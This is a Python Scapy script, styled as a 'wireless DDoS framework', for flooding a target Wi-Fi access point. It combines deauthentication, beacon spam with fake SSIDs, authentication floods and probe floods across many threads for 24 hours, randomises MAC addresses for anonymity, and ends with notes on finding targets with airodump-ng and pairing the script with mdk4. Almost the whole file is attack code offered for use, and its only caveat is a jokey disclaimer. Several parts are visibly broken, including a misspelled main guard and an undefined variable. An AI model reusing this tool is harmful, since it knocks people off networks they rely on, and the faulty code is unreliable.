#!/usr/bin/env python3

"""
MASSIVE 802.11 WIRELESS DDoS FRAMEWORK - DAMUKOON v0.1
Version: v0.1
Author:  Rip70022/craxterpy
Target:  IEEE 802.11 a/b/g/n/ac/ax networks
Mode:    Aggressive Multi-Vector Flood Attack
Requires:
- Linux
- Python 3.10+
- Root privileges
- Wireless interface in monitor mode
- Scapy 2.5.0+
- numpy
"""

# ======================== ☠️ CONFIGURATION OF CHAOS ☠️ ========================
ATTACK_DURATION = 86400  # 24 hours of pure mayhem
THREAD_COUNT = 66       # Number of concurrent attack threads
CLONE_SSIDS = ["FBI Surveillance Van #","Free Virus","Starbucks","Linksys"]  # SSIDs for beacon spam
RANDOM_MACS = True      # Randomize MAC addresses for anonymity
CHANNEL_HOP_INTERVAL = 0.5  # Channel hopping interval in seconds
# ==============================================================================

import os
import sys
import time
import random
import signal
import threading
from argparse import ArgumentParser, RawTextHelpFormatter
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth, RadioTap, Dot11ProbeReq, Dot11Auth

# ༼ つ ◕◕ ༽つ GLOBAL VARIABLES ༼ つ ◕◕ ༽つ
stop_signal = False
interface = ""
target_bssid = ""
broadcast_mac = "ff:ff:ff:ff:ff:ff"
channel_lock = threading.Lock()
current_channel = 1

# ٩(͡๏̯͡๏)۶ ASCII ART PROGRESS BARS ٩(͡๏̯͡๏)۶
BANNER = r"""
▓█████▄  ▄▄▄       ███▄ ▄███▓ █    ██  ██ ▄█▀▓█████▄  ▒█████   ███▄    █ 
▒██▀ ██▌▒████▄    ▓██▒▀█▀ ██▒ ██  ▓██▒ ██▄█▒ ▒██▀ ██▌▒██▒  ██▒ ██ ▀█   █ 
░██   █▌▒██  ▀█▄  ▓██    ▓██░▓██  ▒██░▓███▄░ ░██   █▌▒██░  ██▒▓██  ▀█ ██▒
░▓█▄   ▌░██▄▄▄▄██ ▒██    ▒██ ▓▓█  ░██░▓██ █▄ ░▓█▄   ▌▒██   ██░▓██▒  ▐▌██▒
░▒████▓  ▓█   ▓██▒▒██▒   ░██▒▒▒█████▓ ▒██▒ █▄░▒████▓ ░ ████▓▒░▒██░   ▓██░
 ▒▒▓  ▒  ▒▒   ▓▒█░░ ▒░   ░  ░░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒ ▒▒▓  ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
 ░ ▒  ▒   ▒   ▒▒ ░░  ░      ░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ▒  ▒   ░ ▒ ▒░ ░ ░░   ░ ▒░
 ░ ░  ░   ░   ▒   ░      ░    ░░░ ░ ░ ░ ░░ ░  ░ ░  ░ ░ ░ ░ ▒     ░   ░ ░ 
   ░          ░  ░       ░      ░     ░  ░      ░        ░ ░           ░ 
 ░                                                  ░                     
"""

# (╯°□°）╯︵ ┻━┻ SIGNAL HANDLER (╯°□°）╯︵ ┻━┻
def signal_handler(sig, frame):
    global stop_signal
    print("\n[!] Nuclear launch detected! Terminating attack sequences...")
    stop_signal = True
    sys.exit(0)

# (⌐■■) MONITOR MODE CHECK (⌐■■) 
def check_monitor_mode(iface):
    mode = os.popen(f"iwconfig {iface} | grep Mode").read()
    if "Mode:Monitor" not in mode:
        print(f"[X] Interface {iface} not in monitor mode!")
        print("[!] Activate monitor mode with: airmon-ng start " + iface)
        sys.exit(1)

# (☞ﾟヮﾟ)☞ CHANNEL HOPPER ☜(ﾟヮﾟ☜)
def channel_hopper():
    global current_channel
    channels = [1, 6, 11]  # 2.4GHz non-overlapping
    if not stop_signal:
        with channel_lock:
            current_channel = random.choice(channels)
            os.system(f"iwconfig {interface} channel {current_channel}")
        time.sleep(CHANNEL_HOP_INTERVAL)
        channel_hopper()

# (ง •̀_•́)ง DEAUTH NUKER (ง •̀_•́)ง
def deauth_attack():
    packet = RadioTap() / \
             Dot11(addr1=broadcast_mac, addr2=target_bssid, addr3=target_bssid) / \
             Dot11Deauth(reason=7)
    while not stop_signal:
        sendp(packet, iface=interface, count=1000, inter=0.0001, verbose=0)

# (ﾉ◕ヮ◕)ﾉ*:・ﾟ✧ BEACON SPAMMER (ﾉ◕ヮ◕)ﾉ*:・ﾟ✧
def beacon_spam():
    seq = 0
    while not stop_signal:
        ssid = random.choice(CLONE_SSIDS) + str(random.randint(1,999))
        mac = RandMAC() if RANDOM_MACS else "00:01:02:03:04:05"
        dot11 = Dot11(type=0, subtype=8, addr1=broadcast_mac,
                      addr2=mac, addr3=mac)
        beacon = Dot11Beacon(cap='ESS+privacy')
        essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
        frame = RadioTap()/dot11/beacon/essid
        sendp(frame, iface=interface, verbose=0)
        seq += 1

# (╯▀̿ ̿ ͜ʖ ▀̿ ̿)╯┻━┻ AUTH FLOOD (╯▀̿ ̿ ͜ʖ ▀̿ ̿)╯┻━┻
def auth_flood():
    while not stop_signal:
        mac = RandMAC() if RANDOM_MACS else "00:01:02:03:04:05"
        packet = RadioTap() / \
                 Dot11(subtype=11, addr1=target_bssid, addr2=mac, addr3=target_bssid) / \
                 Dot11Auth(algo=0, seqnum=1, status=0)
        sendp(packet, iface=interface, count=500, inter=0.001, verbose=0)

# (ง'̀-'́)ง PROBE RESPONSE FLOOD (ง'̀-'́)ง
def probe_flood():
    while not stop_signal:
        mac = RandMAC() if RANDOM_MACS else "00:01:02:03:04:05"
        packet = RadioTap() / \
                 Dot11(type=0, subtype=5, addr1=mac, addr2=target_bssid, addr3=target_bssid) / \
                 Dot11ProbeReq() / \
                 Dot11Elt(ID='SSID', info=random.choice(CLONE_SSIDS), len=len(ssid))
        sendp(packet, iface=interface, count=300, inter=0.002, verbose=0)

# (☠️💀) MAIN ATTACK ORCHESTRATOR (☠️💀)
def main():
    print(BANNER)
    signal.signal(signal.SIGINT, signal_handler)
    
    parser = ArgumentParser(description="WIFI-DDOS v0x666", formatter_class=RawTextHelpFormatter)
    parser.add_argument("-i", "--interface", required=True, help="Wireless interface")
    parser.add_argument("-b", "--bssid", required=True, help="Target BSSID")
    args = parser.parse_args()

    global interface, target_bssid
    interface = args.interface
    target_bssid = args.bssid
    
    check_monitor_mode(interface)
    
    print(f"[+] Initializing APOCALYPSE on {target_bssid} via {interface}")
    print(f"[+] Spawning {THREAD_COUNT} threads of destruction...")
    
    # Start channel hopper
    threading.Thread(target=channel_hopper, daemon=True).start()
    
    # Launch attack vectors
    attacks = [deauth_attack, beacon_spam, auth_flood, probe_flood]
    threads = []
    
    for _ in range(THREAD_COUNT):
        for attack in attacks:
            t = threading.Thread(target=attack)
            t.daemon = True
            threads.append(t)
            t.start()
    
    print("[!] Maximum damage initiated. CTRL+C to abort mission.")
    time.sleep(ATTACK_DURATION)

if _name_ == "_main_":
    main()

"""
███████████████████████████████████████████████████████████████████████████
                     POST-EXECUTION NOTES:
1. Requires monitor mode: airmon-ng start wlan0
2. Find target BSSID: airodump-ng wlan0mon
3. Tested on Kali 1/30/2025 with Atheros AR9271 chipset
4. Optimal performance requires 5GHz capable hardware
5. Combine with: mdk4 wlan0mon d -c <channel>

███████████████████████████████████████████████████████████████████████████
                        LEGAL DISCLAIMER:
This script demonstrates wireless network vulnerabilities. Use only on networks
you own or have explicit permission to test. The author assumes no liability
for unauthorized use. Violators will be tracked, hacked, and reported to the
Cyber Police. Consequences will never be the same.

███████████████████████████████████████████████████████████████████████████
"""
